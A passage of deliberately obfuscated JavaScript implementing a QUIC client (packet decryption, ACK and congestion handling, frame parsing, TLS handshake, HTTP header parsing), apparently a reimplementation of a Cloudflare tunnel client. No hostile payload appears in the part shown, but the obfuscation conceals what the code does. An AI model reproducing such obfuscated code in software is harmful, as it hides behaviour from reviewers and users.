                this[ja(0x44b)] = Buffer[ja(0x1e7)](a['token']);
                continue;
            case '5':
                this[ja(0xb68)] = 0x0;
                continue;
            case '6':
                this[ja(0x305)][ja(0x3a5)](b[ja(0xa43)](b[ja(0x997)](b['GMmdL'](b[ja(0x2ce)], a[ja(0x9ad)][ja(0x55c)]), b[ja(0x8f9)]), a['scid']['toString'](ja(0x47c))));
                continue;
            }
            break;
        }
    }
    [a0cm(0x9ff)](a) {
        if (a === 0x0 || a === 0x1)
            return a0bk;
        return a0bl;
    }
    [a0cm(0x500)](a, b) {
        const jb = a0cm, c = {
                'mOOqT': function (m, n) {
                    return m === n;
                },
                'wBXLQ': function (m, n) {
                    return m < n;
                },
                'bGfgq': function (m, n, o, p, q) {
                    return m(n, o, p, q);
                },
                'MHHfc': function (m, n) {
                    return m + n;
                },
                'bQKza': function (m, n) {
                    return m & n;
                },
                'QPiSH': function (m, n, o, p) {
                    return m(n, o, p);
                },
                'atpUi': function (m, n) {
                    return m + n;
                },
                'HRGaw': function (m, n) {
                    return m + n;
                },
                'GDbiZ': jb(0xc2f),
                'VgeLU': function (m, n) {
                    return m === n;
                },
                'aArpO': function (m, n) {
                    return m === n;
                },
                'ysvKe': jb(0x495),
                'OCpTn': function (m, n) {
                    return m + n;
                },
                'eOtuq': function (m, n) {
                    return m + n;
                },
                'CgVsf': function (m, n) {
                    return m + n;
                },
                'yypnh': function (m, n) {
                    return m + n;
                },
                'NVvQO': '\x20pn=',
                'LCtmS': 'handshake\x20packet\x20received'
            }, d = this[jb(0x9ff)](b[jb(0x483)]), f = this[jb(0x40f)][d];
        if (c['mOOqT'](f, null)) {
            this[jb(0x7d8)]['dropped'] += 0x1;
            return;
        }
        if (c[jb(0x22b)](b['length'], a0bh)) {
            this[jb(0x7d8)][jb(0x2b1)] += 0x1;
            return;
        }
        const g = c['bGfgq'](a0bG, f['recv'], a, b['pnOffset'], !![]);
        if (c[jb(0x56b)](g, null)) {
            this['stats']['dropped'] += 0x1;
            return;
        }
        const [h, i] = g, j = c[jb(0x9c2)](c[jb(0xad3)](h[0x0], 0x3), 0x1), k = c[jb(0xc1b)](a0bH, Math['max'](this[jb(0xd6c)][d], 0x0), j * 0x8, i);
        let l;
        try {
            l = f[jb(0xa16)][jb(0x3f8)](k, h, a[jb(0x262)](c[jb(0x9c2)](b[jb(0x379)], j)));
        } catch (m) {
            this['stats']['dropped'] += 0x1, this[jb(0x305)][jb(0x3a5)](c[jb(0x922)](c['HRGaw'](c[jb(0xb44)] + a[jb(0x55c)] + 'B\x20', a0bn[d]), jb(0xb1b)));
            return;
        }
        c[jb(0x9cb)](d, a0bk) && c[jb(0x316)](b[jb(0x777)]['length'], this[jb(0x39b)][jb(0x55c)]) && b[jb(0x777)][jb(0x20b)](this[jb(0x39b)]) && (!this[jb(0x4a7)] && b[jb(0xc8e)][jb(0x55c)] && !this[jb(0x2e2)][jb(0x20b)](b['scid']) && (this[jb(0x2e2)] = Buffer['from'](b[jb(0xc8e)]), this['log'][jb(0x3a5)](c[jb(0xa47)] + this[jb(0x2e2)][jb(0x7a0)]('hex')))), this[jb(0x3ea)](d, k), this[jb(0x305)][jb(0x3a5)](c['OCpTn'](c[jb(0x722)](c['CgVsf'](c['yypnh']('rx\x20', a[jb(0x55c)]), 'B\x20'), a0bn[d]) + c[jb(0xaef)], k)), c[jb(0x9cb)](d, a0bl) && this[jb(0xba7)](a0bk, c[jb(0x5e4)]), this['_handleFrames'](l, d);
    }
    [a0cm(0xaf1)](a) {
        const jc = a0cm, b = {
                'BwBgP': function (i, j) {
                    return i + j;
                },
                'CsQeP': function (i, j) {
                    return i + j;
                },
                'PIJuc': jc(0xc2f),
                'yJGCg': jc(0x1b8),
                'ENdfw': function (i, j) {
                    return i === j;
                },
                'ZuHpf': function (i, j) {
                    return i + j;
                },
                'PpPby': function (i, j) {
                    return i - j;
                },
                'ENSCE': function (i, j, k, l, m) {
                    return i(j, k, l, m);
                },
                'BmvQq': function (i, j) {
                    return i + j;
                },
                'PURml': function (i, j) {
                    return i & j;
                },
                'kwHVY': function (i, j) {
                    return i * j;
                },
                'doKVA': function (i, j) {
                    return i + j;
                },
                'NjfrB': function (i, j) {
                    return i > j;
                },
                'JRlhb': jc(0xc03),
                'dfrwn': function (i, j) {
                    return i + j;
                },
                'upvDp': function (i, j) {
                    return i + j;
                },
                'lAjOj': 'B\x20one-rtt\x20pn=',
                'pbNbd': function (i, j) {
                    return i + j;
                }
            }, c = this['keys'][a0bm];
        if (c === null) {
            this['stats']['dropped'] += 0x1, this[jc(0x305)][jc(0x3a5)](b[jc(0x9c6)](b[jc(0xef)](b[jc(0xd9b)], a[jc(0x55c)]), b[jc(0x9bf)]));
            return;
        }
        b[jc(0x44d)](this['appRecvGens'][jc(0x55c)], 0x0) && this[jc(0x992)]['push']({
            'keys': c['recv'],
            'phase': 0x0
        });
        const d = b[jc(0x21c)](0x1, this['ourCid'][jc(0x55c)]), f = [];
        for (const i of [c['recv']][jc(0x5f9)](this[jc(0x992)][jc(0x8a0)](j => j[jc(0x40f)]))) {
            f[jc(0x1eb)](i) < 0x0 && f[jc(0x1d5)](i);
        }
        const g = this[jc(0x992)][0x0], h = this['appRecvGens'][jc(0x5f9)]([{
                    'keys': a0bz(g[jc(0x40f)]),
                    'phase': b[jc(0xb17)](0x1, g['phase']),
                    'next': !![]
                }]);
        for (const j of h) {
            for (const k of j[jc(0xa7a)] ? f[jc(0x5f9)]([j[jc(0x40f)]]) : f) {
                const l = b[jc(0x823)](a0bG, k, a, d, ![]);
                if (l === null)
                    continue;
                const [m, n] = l, o = b['BmvQq'](b[jc(0x416)](m[0x0], 0x3), 0x1), p = a0bH(Math[jc(0x60c)](this[jc(0xd6c)][a0bm], 0x0), b[jc(0xd8b)](o, 0x8), n);
                let q;
                try {
                    q = j[jc(0x40f)]['open'](p, m, a['subarray'](b[jc(0xb2f)](d, o)));
                } catch (r) {
                    continue;
                }
                if (j[jc(0xa7a)]) {
                    const s = jc(0xab5)[jc(0xb0c)]('|');
                    let t = 0x0;
                    while (!![]) {
                        switch (s[t++]) {
                        case '0':
                            this[jc(0x7f8)][j[jc(0x989)]] = a0bz(this[jc(0x7f8)][b[jc(0xb17)](0x1, j['phase'])], !![]);
                            continue;
                        case '1':
                            this['appKeyPhase'] = j[jc(0x989)];
                            continue;
                        case '2':
                            this[jc(0x992)]['unshift']({
                                'keys': j[jc(0x40f)],
                                'phase': j['phase']
                            });
                            continue;
                        case '3':
                            b[jc(0x53d)](this[jc(0x992)]['length'], 0x2) && this['appRecvGens'][jc(0x3a6)]();
                            continue;
                        case '4':
                            this[jc(0x305)][jc(0x3a5)](jc(0xcdd) + j['phase'] + b[jc(0x484)]);
                            continue;
                        }
                        break;
                    }
                }
                this[jc(0x3ea)](a0bm, p), this[jc(0x305)]['debug'](b['dfrwn'](b['upvDp'](jc(0xc2f) + a['length'], b[jc(0x309)]), p)), this[jc(0xa35)](q, a0bm);
                return;
            }
        }
        this[jc(0x7d8)][jc(0x2b1)] += 0x1, this['log'][jc(0x3a5)](b[jc(0xb2f)](b[jc(0x98c)](b[jc(0xd9b)], a['length']), jc(0x651)));
    }
    [a0cm(0x3ea)](a, b) {
        const jd = a0cm, c = {
                'DbYEV': function (d, f, g) {
                    return d(f, g);
                },
                'LoTwc': function (d, f) {
                    return d > f;
                }
            };
        this[jd(0x1ff)][a] = c[jd(0x613)](a0bC, this['recvRanges'][a], [{
                'start': b,
                'length': 0x1
            }]), c[jd(0x984)](b, this[jd(0xd6c)][a]) && (this[jd(0xd6c)][a] = b), this[jd(0x6ca)][a] = !![];
    }
    ['_applyAck'](a, b) {
        const je = a0cm, c = {
                'luRAT': function (m, n) {
                    return m - n;
                },
                'veTSB': function (m, n) {
                    return m >= n;
                },
                'YIxec': function (m, n) {
                    return m < n;
                },
                'BaXaT': function (m, n) {
                    return m + n;
                },
                'hPHHN': function (m, n) {
                    return m === n;
                },
                'NyPLK': function (m, n) {
                    return m !== n;
                },
                'yiaiM': function (m, n) {
                    return m - n;
                },
                'svfGF': function (m, n) {
                    return m - n;
                },
                'ypmAz': function (m, n) {
                    return m >= n;
                },
                'CGhsB': function (m, n) {
                    return m - n;
                },
                'aIDVL': function (m, n) {
                    return m !== n;
                }
            }, d = Date[je(0x866)](), f = this[je(0x13b)][a];
        let g = -0x1;
        for (const m of b) {
            g = Math['max'](g, c['luRAT'](m[je(0xae2)] + m[je(0x55c)], 0x1));
        }
        const h = [];
        let i = 0x0, j = null;
        for (const n of f) {
            let o = ![];
            for (const p of b) {
                if (c['veTSB'](n['pn'], p[je(0xae2)]) && c['YIxec'](n['pn'], c['BaXaT'](p[je(0xae2)], p[je(0x55c)]))) {
                    o = !![];
                    break;
                }
            }
            if (!o) {
                h[je(0x1d5)](n);
                continue;
            }
            i += n[je(0x6c9)];
            c[je(0xbdc)](n['pn'], g) && c[je(0x537)](n[je(0x3e6)], !![]) && (j = c[je(0x58c)](c[je(0x5b2)](d, n[je(0x8a1)]), Math[je(0x389)](b['ackDelay'] || 0x0, this['peerMaxAckDelay'])));
            n['crypto'] && this[je(0x8f8)][a][je(0x529)](n['crypto']['start'], n[je(0x7c9)][je(0x55c)], ![]);
            for (const q of n['streams']) {
                q[je(0xa1a)][je(0x77d)][je(0x529)](q[je(0xae2)], q[je(0x55c)], q[je(0xad1)]);
            }
        }
        const k = [], l = [];
        for (const r of h) {
            c[je(0x6ee)](c[je(0xb45)](g, r['pn']), this[je(0x6f8)]) ? l[je(0x1d5)](r) : k[je(0x1d5)](r);
        }
        this[je(0x13b)][a] = k;
        i && (c[je(0x7ce)](j, null) && j > 0x0 && this[je(0xcd9)](j), this[je(0xb00)](), this[je(0x179)](i));
        for (const s of l) {
            this[je(0xc71)](a, s);
        }
        l[je(0x55c)] && this['_onLoss'](a), c[je(0xbdc)](a, a0bm) && c[je(0x17f)](k[je(0x55c)], f[je(0x55c)]) && this['_confirmHandshake']();
    }
    ['_growWindow'](a) {
        const jf = a0cm, b = {
                'hPxtS': function (c, d) {
                    return c < d;
                },
                'BYvKL': function (c, d) {
                    return c / d;
                },
                'LxIbD': function (c, d) {
                    return c * d;
                }
            };
        b[jf(0xc33)](this[jf(0x7aa)], this[jf(0xbb4)]) ? this[jf(0x7aa)] += a : this[jf(0x7aa)] += Math[jf(0x60c)](0x1, Math['floor'](b[jf(0x7d6)](b[jf(0x1bd)](this['maxPacket'], a), this[jf(0x7aa)]))), this[jf(0x7aa)] = Math['min'](this['congestionWindow'], this[jf(0xd7d)]);
    }
    ['_handleFrames'](a, b) {
        const jg = a0cm, c = {
                'rrCke': function (f, g) {
                    return f > g;
                },
                'RydAO': function (f, g) {
                    return f === g;
                },
                'RtSfi': function (f, g) {
                    return f === g;
                },
                'qmgFq': function (f, g) {
                    return f === g;
                },
                'KdvgL': function (f, g) {
                    return f(g);
                },
                'IHsrb': function (f, g) {
                    return f < g;
                },
                'QdnEU': function (f, g) {
                    return f === g;
                },
                'OMpFW': function (f, g) {
                    return f & g;
                },
                'EZqVR': function (f, g) {
                    return f & g;
                },
                'iZsHk': function (f, g) {
                    return f(g);
                },
                'PDHbR': function (f, g) {
                    return f & g;
                },
                'bsklL': function (f, g) {
                    return f < g;
                },
                'AjmyS': function (f, g) {
                    return f !== g;
                },
                'LlOXC': function (f, g) {
                    return f === g;
                },
                'zxmtp': function (f, g) {
                    return f + g;
                },
                'lXXXy': function (f, g) {
                    return f === g;
                },
                'uKtTD': function (f, g) {
                    return f === g;
                },
                'KwFIT': function (f, g) {
                    return f !== g;
                },
                'liljv': function (f, g) {
                    return f === g;
                },
                'FIcIu': function (f, g) {
                    return f === g;
                },
                'fPipJ': jg(0x7d9),
                'jjNuj': function (f, g) {
                    return f + g;
                },
                'rGHkD': function (f, g) {
                    return f + g;
                },
                'neUVm': jg(0xa57),
                'yLFbf': jg(0x71d),
                'DejZU': jg(0xc34)
            }, d = new a0bu(a);
        while (c[jg(0x9ea)](d[jg(0x90b)], 0x0)) {
            const f = d['byte']();
            if (c[jg(0x605)](f, a0bo[jg(0x111)]))
                continue;
            if (c[jg(0x875)](f, a0bo[jg(0x843)]))
                continue;
            if (c[jg(0x605)](f, a0bo[jg(0x529)]) || c['qmgFq'](f, a0bo[jg(0x948)])) {
                const g = c[jg(0x961)](a0bJ, d);
                c['RydAO'](f, a0bo[jg(0x948)]) && (d[jg(0x432)](), d['varint'](), d[jg(0x432)]());
                this['_applyAck'](b, g);
                continue;
            }
            if (c['RtSfi'](f, a0bo['crypto'])) {
                const h = d[jg(0x6a7)](), i = d[jg(0x6a7)]();
                if (c[jg(0x889)](d['remaining'], i))
                    return;
                const j = d['bytes'](i), k = this['tlsOffsets'][b][jg(0x1e9)](h, j);
                k[jg(0x55c)] && this[jg(0xc22)](b, k);
                continue;
            }
            if (c[jg(0x2d1)](c[jg(0x1e8)](f, 0xf8), a0bo[jg(0xa1a)])) {
                const l = c[jg(0x581)](f, 0x7), m = c[jg(0x961)](Number, d[jg(0x432)]()), n = c['iZsHk'](Boolean, l & 0x2), o = Boolean(c[jg(0x705)](l, 0x4)), p = c['KdvgL'](Boolean, l & 0x1);
                let q = 0x0;
                o && (q = d['number']());
                let r = d[jg(0x90b)];
                n && (r = d[jg(0x6a7)]());
                if (c['bsklL'](d[jg(0x90b)], r))
                    return;
                this[jg(0x10e)](m, q, d['bytes'](r), p);
                continue;
            }
            if (c[jg(0x605)](f, a0bo[jg(0x4d4)])) {
                this[jg(0x12d)] = Math[jg(0x60c)](this[jg(0x12d)], d['number']());
                continue;
            }
            if (c[jg(0x605)](f, a0bo['maxStreamData'])) {
                const s = d[jg(0x6a7)](), t = this[jg(0x907)]['get'](s);
                c[jg(0x2d0)](t, undefined) ? t[jg(0xc8f)] = Math['max'](t[jg(0xc8f)] || 0x0, d[jg(0x6a7)]()) : d[jg(0x432)]();
                continue;
            }
            if (f === a0bo[jg(0x8b4)] || c[jg(0x635)](f, a0bo[jg(0x293)])) {
                d[jg(0x432)]();
                continue;
            }
            if (c[jg(0x635)](f, a0bo[jg(0x243)])) {
                d[jg(0x432)](), d[jg(0x432)]();
                const u = d[jg(0x347)]();
                if (d[jg(0x90b)] < c['zxmtp'](u, 0x10))
                    return;
                d[jg(0x6c9)](u), d['bytes'](0x10);
                continue;
            }
            if (c[jg(0x2d1)](f, a0bo['retireConnectionId'])) {
                d[jg(0x432)]();
                continue;
            }
            if (f === a0bo[jg(0x433)]) {
                if (c[jg(0x3c1)](d[jg(0x90b)], 0x8))
                    return;
                const v = d[jg(0x6c9)](0x8), w = new a0bt();
                w[jg(0x347)](a0bo[jg(0x7fe)])['bytes'](v), this[jg(0x757)](w['build'](), b);
                continue;
            }
            if (c[jg(0xb30)](f, a0bo[jg(0x7fe)]))
                continue;
            if (f === a0bo['handshakeDone']) {
                this[jg(0xcd5)]();
                continue;
            }
            if (c[jg(0x2cf)](f, a0bo['resetStream'])) {
                const x = d[jg(0x6a7)]();
                d[jg(0x432)](), d[jg(0x432)]();
                const y = this[jg(0x907)][jg(0x81a)](x);
                c[jg(0x917)](y, undefined) && (y[jg(0x271)] = !![], this[jg(0x3aa)](y));
                continue;
            }
            if (c[jg(0x605)](f, a0bo[jg(0x5ac)])) {
                d[jg(0x432)](), d['varint']();
                continue;
            }
            if (c[jg(0x565)](f, a0bo[jg(0xc16)])) {
                const z = d['number']();
                this[jg(0x44b)] = Buffer[jg(0x1e7)](d[jg(0x6c9)](z));
                continue;
            }
            if (c[jg(0x565)](f, a0bo[jg(0x790)]) || c[jg(0x605)](f, a0bo[jg(0xb9e)])) {
                const A = d[jg(0x6a7)]();
                let B = 0x0;
                c[jg(0x35b)](f, a0bo[jg(0x790)]) && (B = d[jg(0x6a7)]());
                const C = d[jg(0x90b)] ? d[jg(0x6c9)](d[jg(0x90b)])[jg(0x7a0)](c[jg(0xa31)]) : '';
                this[jg(0x6a5)](c[jg(0xcc6)](c['rGHkD'](c[jg(0x8e3)], A), c[jg(0x842)]) + C);
                return;
            }
            if (c['liljv'](f, a0bo[jg(0x8a4)]) || c[jg(0xb30)](f, a0bo['datagramLen'])) {
                let D = d[jg(0x90b)];
                c[jg(0x635)](f, a0bo['datagramLen']) && (D = d[jg(0x6a7)]());
                if (d[jg(0x90b)] < D)
                    return;
                d['bytes'](D);
                continue;
            }
            this[jg(0x6a5)](c[jg(0x540)](c[jg(0x6cb)], f[jg(0x7a0)](0x10)));
            return;
        }
    }
    [a0cm(0x757)](a, b) {
        const jh = a0cm;
        this['ackPending'][b] = !![], this[jh(0x7ed)] = this[jh(0x7ed)] || [], this['pendingOneOff'][jh(0x1d5)]({
            'epoch': b,
            'frame': a
        });
    }
    [a0cm(0x10e)](a, b, c, d) {
        const ji = a0cm, f = {
                'dXZFr': function (i, j) {
                    return i === j;
                },
                'DMygZ': function (i, j) {
                    return i & j;
                },
                'dKImw': ji(0x514),
                'iLQZk': 'local',
                'CAJOv': function (i, j) {
                    return i < j;
                },
                'fPqmu': function (i, j) {
                    return i - j;
                },
                'NYjmJ': function (i, j) {
                    return i - j;
                },
                'bkncB': function (i, j) {
                    return i / j;
                },
                'AgvyX': function (i, j) {
                    return i + j;
                },
                'mJxvU': function (i, j) {
                    return i === j;
                }
            };
        let g = this['streams']['get'](a);
        g === undefined && (g = new a0bQ(this, a, f[ji(0x7a8)](f[ji(0xb7a)](a, 0x1), 0x1) ? f['dKImw'] : f['iLQZk']), this[ji(0x907)][ji(0x689)](a, g), this[ji(0x784)](g));
        const h = g[ji(0x34a)][ji(0x1e9)](b, c);
        if (h[ji(0x55c)]) {
            const i = ji(0xd18)[ji(0xb0c)]('|');
            let j = 0x0;
            while (!![]) {
                switch (i[j++]) {
                case '0':
                    f['CAJOv'](f[ji(0xd25)](g['localLimit'], g[ji(0xa16)][ji(0x55c)]), this['receiveWindow'] / 0x2) && (g[ji(0x3f2)] = g[ji(0xa16)][ji(0x55c)] + this[ji(0x782)], f[ji(0x95f)](this[ji(0x897)][ji(0x1eb)](g), 0x0) && this[ji(0x897)][ji(0x1d5)](g));
                    continue;
                case '1':
                    this['_wake']();
                    continue;
                case '2':
                    this[ji(0xbb7)](g, h);
                    continue;
                case '3':
                    f[ji(0x95f)](f[ji(0x725)](this[ji(0x265)], this[ji(0x704)]), f['bkncB'](this[ji(0x782)], 0x2)) && (this[ji(0x265)] = f[ji(0x9b4)](this['consumedTotal'], this[ji(0x782)]), this[ji(0x535)] = !![]);
                    continue;
                case '4':
                    g[ji(0xa16)] = Buffer[ji(0x5f9)]([
                        g[ji(0xa16)],
                        h
                    ]);
                    continue;
                case '5':
                    this[ji(0x704)] += h[ji(0x55c)];
                    continue;
                }
                break;
            }
        }
        d && !g['ended'] && f[ji(0x4e0)](g[ji(0x34a)]['contiguous'], g['recv'][ji(0x55c)]) && (g[ji(0xbd8)] = !![], this[ji(0x3aa)](g));
    }
    ['_wake']() {
        const jj = a0cm;
        !this[jj(0x874)] && this[jj(0xb7c)]();
    }
    ['_consumeTls'](a, b) {
        const jk = a0cm, c = {
                'tixQT': function (d, f) {
                    return d === f;
                },
                'eKyBK': jk(0x9ef),
                'mkRlV': jk(0x13f),
                'tGuRs': function (d, f) {
                    return d + f;
                },
                'KrVnP': jk(0x642)
            };
        if (c[jk(0x9a5)](a, a0bm))
            return;
        if (c['tixQT'](a, a0bk) && c['tixQT'](this[jk(0x2ae)][jk(0xc99)], c[jk(0x1bb)])) {
            this[jk(0x530)] = Buffer['concat']([
                this[jk(0x530)],
                b
            ]);
            let d;
            try {
                d = this[jk(0x2ae)][jk(0x6f6)](this[jk(0x530)]);
            } catch (g) {
                this[jk(0x6a5)](c[jk(0xd7f)] + g['message']);
                return;
            }
            if (d === null)
                return;
            this[jk(0x530)] = Buffer['alloc'](0x0);
            let f;
            try {
                f = this[jk(0x2ae)][jk(0xa4b)](Buffer['from'](d));
            } catch (h) {
                this[jk(0x6a5)](c[jk(0x923)](c[jk(0xd7f)], h['message']));
                return;
            }
            this[jk(0x40f)][a0bl] = f, this[jk(0x305)][jk(0x3a5)](c[jk(0x3ac)]);
            return;
        }
        this[jk(0x6fb)] = Buffer[jk(0x5f9)]([
            this['handshakeBytes'],
            b
        ]), this[jk(0x2fe)]();
    }
    ['_pumpHandshakeMessages']() {
        const jl = a0cm, a = {
                'ZbUhk': function (b, c) {
                    return b + c;
                },
                'MoDCh': function (b, c) {
                    return b < c;
                },
                'EKPbv': function (b, c) {
                    return b + c;
                },
                'jvnIN': jl(0x9ed),
                'ciPoQ': function (b, c) {
                    return b === c;
                },
                'wAeQz': function (b, c) {
                    return b + c;
                },
                'zqvDG': function (b, c) {
                    return b + c;
                },
                'SCzrz': jl(0x645),
                'tZxKr': '\x20stream=',
                'nhmao': function (b, c) {
                    return b !== c;
                },
                'WWUNd': function (b, c) {
                    return b(c);
                },
                'dYrpV': jl(0x7a1),
                'hLmbM': jl(0x555)
            };
        while (this[jl(0x6fb)][jl(0x55c)] >= 0x4) {
            const b = a['ZbUhk'](0x4, this[jl(0x6fb)][jl(0x268)](0x1, 0x3));
            if (a[jl(0xac4)](this[jl(0x6fb)][jl(0x55c)], b))
                return;
            const c = Buffer['from'](this[jl(0x6fb)]['subarray'](0x0, b));
            this['handshakeBytes'] = this['handshakeBytes']['subarray'](b);
            let d;
            try {
                d = this[jl(0x2ae)][jl(0x85c)](c);
            } catch (f) {
                this[jl(0x6a5)](a[jl(0x8f1)](a[jl(0x49e)], f[jl(0xbe8)]));
                return;
            }
            this['tls'][jl(0xd09)] && a['ciPoQ'](this[jl(0xd09)], null) && (this['remoteParameters'] = this[jl(0x2ae)][jl(0xd09)], this[jl(0x12d)] = this[jl(0x2ae)][jl(0xd09)][a0bp[jl(0xaf8)]] || 0x0, this['peerStreamRemote'] = this['tls']['remoteParameters'][a0bp[jl(0x649)]] || 0x0, this[jl(0x95d)] = this[jl(0x2ae)][jl(0xd09)][a0bp['initialMaxStreamDataBidiLocal']] || 0x0, this[jl(0x4ec)] = Math[jl(0x389)](this[jl(0x2ae)]['remoteParameters'][a0bp[jl(0x5c6)]] === undefined ? 0x19 : this['tls'][jl(0xd09)][a0bp[jl(0x5c6)]], 0x64), this[jl(0x305)][jl(0x3a5)](a[jl(0x3dd)](a[jl(0xb35)](a[jl(0x8f1)](a['EKPbv'](a['SCzrz'], this[jl(0x12d)]), a[jl(0xd55)]), this['peerStreamRemote']) + jl(0xa00), this[jl(0x2ae)][jl(0xd09)][a0bp[jl(0xc30)]] || 0x0)));
            if (a['nhmao'](d, null)) {
                if (this[jl(0x3db)]) {
                    const g = a[jl(0x6c6)](a0bP, this[jl(0x2ae)]['leafCert']);
                    if (g) {
                        this[jl(0x6a5)](a[jl(0x4ab)] + g);
                        return;
                    }
                }
                this['keys'][a0bm] = {
                    'send': d[jl(0x77d)],
                    'recv': d[jl(0xa16)]
                }, this[jl(0x992)] = [{
                        'keys': d[jl(0xa16)],
                        'phase': 0x0
                    }], this[jl(0x7f8)][0x0] = d[jl(0x77d)], this[jl(0x8f8)][a0bl][jl(0x329)](d[jl(0xc50)], ![]), this[jl(0x4a7)] = !![];
                !d[jl(0x343)] && this[jl(0x305)][jl(0x756)]('server\x20Finished\x20verify_data\x20mismatch');
                this[jl(0x305)][jl(0x3a5)](a['zqvDG'](a[jl(0x137)], this[jl(0x2ae)][jl(0x97b)] || '?'));
                if (this[jl(0xbb2)] !== null) {
                    const h = this[jl(0xbb2)];
                    this[jl(0xbb2)] = null, h[jl(0x48d)](this);
                }
                this[jl(0xc4f)]();
                return;
            }
        }
    }
    [a0cm(0x7bc)](a) {
        const jm = a0cm, b = {
                'gzXBg': jm(0x86d),
                'uinQp': function (f, g) {
                    return f || g;
                }
            }, c = b[jm(0xb94)]['split']('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                if (this['closed'])
                    return;
                continue;
            case '1':
                this[jm(0xbdb)] = !![];
                continue;
            case '2':
                setTimeout(() => this['_finish'](null), 0xc8);
                continue;
            case '3':
                this['closeReason'] = b[jm(0xd20)](a, jm(0x7bc));
                continue;
            case '4':
                this[jm(0xb7c)]();
                continue;
            }
            break;
        }
    }
    ['_fail'](a) {
        const jn = a0cm, b = {
                'mlzDU': function (c, d) {
                    return c + d;
                }
            };
        if (this['closed'])
            return;
        this['log'][jn(0x3a5)](b['mlzDU']('quic\x20closed:\x20', a)), this['_finish'](new Error(a));
    }
    [a0cm(0xc2e)](a) {
        const jo = a0cm, b = {
                'ZebEU': function (c, d) {
                    return c !== d;
                },
                'KkErW': function (c, d) {
                    return c(d);
                },
                'iwEnq': 'connection\x20closed'
            };
        if (this['closed'])
            return;
        this['closed'] = a ? a[jo(0xbe8)] : jo(0x874);
        b[jo(0x5c2)](this[jo(0x8e0)], null) && (b[jo(0x7a9)](clearInterval, this[jo(0x8e0)]), this[jo(0x8e0)] = null);
        if (b[jo(0x5c2)](this[jo(0xa05)], null)) {
            try {
                this['socket']['close']();
            } catch (c) {
            }
            this[jo(0xa05)] = null;
        }
        if (!this[jo(0x4a7)] && b['ZebEU'](this['settle'], null)) {
            const d = this['settle'];
            this[jo(0xbb2)] = null, d[jo(0xae0)](a || new Error(b[jo(0xc69)]));
        } else
            this[jo(0x7fc)](a);
    }
}
function a0bS(a, b) {
    const jp = a0cm, c = {
            'Sjevw': function (f, g) {
                return f === g;
            }
        }, d = [];
    for (const [f, g] of a) {
        c[jp(0x743)](f[jp(0x426)](), b) && d[jp(0x1d5)](g);
    }
    return d;
}
function a0bT(a) {
    const jq = a0cm, b = {
            'YaQXP': function (i, j) {
                return i + j;
            },
            'ZhXBQ': function (i, j) {
                return i + j;
            },
            'bAVPZ': jq(0x2ea),
            'Jjoor': function (i, j) {
                return i + j;
            },
            'hlMOA': function (i, j, k) {
                return i(j, k);
            },
            'TBhms': jq(0x5be),
            'bJunu': function (i, j, k) {
                return i(j, k);
            },
            'HRmGe': 'GET',
            'FmidX': function (i, j) {
                return i > j;
            }
        }, c = new Map(), d = [];
    for (const [i, j] of a[jq(0x3fa)]) {
        if (i['indexOf'](a0ba) >= 0x0) {
            const k = i[jq(0xb0c)](':');
            if (k[jq(0x55c)] !== 0x2)
                throw new Error(b[jq(0x472)](b[jq(0x464)](jq(0x4c7), i), b[jq(0x5ce)]));
            d['push']([
                k[0x1],
                j
            ]);
        } else
            c[jq(0x689)](i, j);
    }
    let f = a[jq(0x53c)];
    try {
        const l = new URL(a[jq(0x53c)]);
        f = b[jq(0x524)](l['pathname'], l[jq(0x91f)]);
    } catch (m) {
        f = a[jq(0x53c)];
    }
    const g = Number(b[jq(0x417)](a0bS, d, b['TBhms'])[0x0]), h = b[jq(0x1c7)](a0bS, d, jq(0x5ed))['join'](',')['toLowerCase']()[jq(0x134)](jq(0xace));
    return {
        'type': a[jq(0x483)],
        'method': c[jq(0x81a)](a0b7) || b[jq(0xbd6)],
        'host': c[jq(0x81a)](a0b8) || '',
        'path': f[jq(0x830)]('/') ? f : '/' + f,
        'headers': d,
        'contentLength': Number[jq(0x53b)](g) && g > 0x0 ? g : null,
        'bodyless': !h && !(Number[jq(0x53b)](g) && b['FmidX'](g, 0x0))
    };
}
function a0bU(a) {
    const jr = a0cm, b = {
            'lIoau': function (d, f) {
                return d !== f;
            },
            'kzKmT': function (d, f) {
                return d >= f;
            }
        }, c = a['request'];
    if (c['bodyless'])
        return !![];
    if (a['ended'])
        return !![];
    return b[jr(0x78e)](c[jr(0xa36)], null) && b[jr(0x882)](a[jr(0x341)][jr(0x55c)], c[jr(0xa36)]);
}
class a0bV {
    constructor(a, b, c, d, f) {
        const js = a0cm;
        this['session'] = a, this[js(0xc99)] = b, this[js(0x16e)] = c, this[js(0x95a)] = d, this[js(0x305)] = f, this['queue'] = [], this[js(0x5de)] = [], this[js(0x691)] = ![], this['sock'] = null;
    }
    [a0cm(0x41f)](a) {
        const jt = a0cm, b = {
                'QOdWi': function (c, d) {
                    return c === d;
                }
            };
        if (b[jt(0x14d)](a, null))
            this[jt(0xd79)][jt(0x1d5)](null);
        else
            a['length'] && this[jt(0xd79)]['push'](a);
        this[jt(0x337)]();
    }
    [a0cm(0x2e8)]() {
        const ju = a0cm, a = {
                'rMyRo': function (b, c) {
                    return b !== c;
                }
            };
        if (this[ju(0x691)])
            return;
        this[ju(0x691)] = !![], this[ju(0x337)]();
        if (a['rMyRo'](this[ju(0x4e3)], null))
            try {
                this[ju(0x4e3)][ju(0xaeb)]();
            } catch (b) {
            }
    }
    [a0cm(0x337)]() {
        const jv = a0cm, a = {
                'xopff': function (b) {
                    return b();
                }
            };
        for (const b of this[jv(0x5de)]) {
            a[jv(0x8c6)](b);
        }
        this[jv(0x5de)] = [];
    }
    async ['_next']() {
        const jw = a0cm;
        while (!this[jw(0x691)]) {
            if (this[jw(0xd79)][jw(0x55c)])
                return this[jw(0xd79)][jw(0x3b0)]();
            await new Promise(a => this[jw(0x5de)][jw(0x1d5)](a));
        }
        return null;
    }
    async [a0cm(0x6fd)]() {
        const jx = a0cm, a = {
                'ZNzXR': function (b, c) {
                    return b(c);
                },
                'PxIrf': function (b, c) {
                    return b(c);
                },
                'SxkRj': function (b, c) {
                    return b + c;
                },
                'HLHcQ': function (b, c) {
                    return b(c);
                },
                'wVNix': function (b, c) {
                    return b === c;
                },
                'Tzubf': function (b, c) {
                    return b === c;
                },
                'Ebibs': jx(0xbe5),
                'leOqR': 'cf-cloudflared-',
                'uTHhC': jx(0x39f),
                'FmnJi': function (b, c) {
                    return b + c;
                },
                'braDo': function (b, c) {
                    return b + c;
                },
                'WBORG': function (b, c) {
                    return b + c;
                },
                'CFbhl': function (b, c) {
                    return b + c;
                },
                'cCzsZ': jx(0x578),
